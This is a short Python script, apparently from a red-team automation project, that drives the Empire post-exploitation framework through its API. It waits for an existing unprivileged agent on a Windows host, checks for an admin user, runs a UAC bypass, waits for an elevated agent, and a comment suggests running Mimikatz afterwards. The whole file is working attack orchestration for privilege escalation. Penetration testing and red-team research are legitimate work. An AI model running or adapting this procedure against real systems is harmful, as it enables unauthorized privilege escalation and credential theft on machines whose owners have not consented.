""" This module demonstrates procedure scripting
    We aim to make procedure as agnostic to techniques whenever possible
    so that we can mix Empire, Metasploit or whatever pen-test framework that
    supports APIs
"""
from empire_settings import *
from EmpireAPIWrapper import empireAPI
from empire_autocomplete import privesc
from stage2.external_c2 import empire_wait_for_agent
from stage3.internal_reconn.windows import empire_is_user_admin
from stage3.escalate_privilege.windows import empire_bypassUAC

try:
    # use a common API context instead of creating a new one per technique
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)

    # we assume there's a non-privilege agent, some stager was executed before
    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', False, 5)
    if agent is None:
        raise ValueError('you need to have an initial agent')

    admin_type = empire_is_user_admin.run(API, agent['name']) 
    if admin_type is None:
        raise ValueError('BypassUAC can only be used with admin user')
    
    empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
    # wait for non-privilege agent
    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True)
    if agent is not None:
        print('yeay!!! we got an {0} admin user'.format(admin_type))    
        # you can run Mimikatz or any privilege activities...
except Exception as e:
    print("Oops: " + str(e))
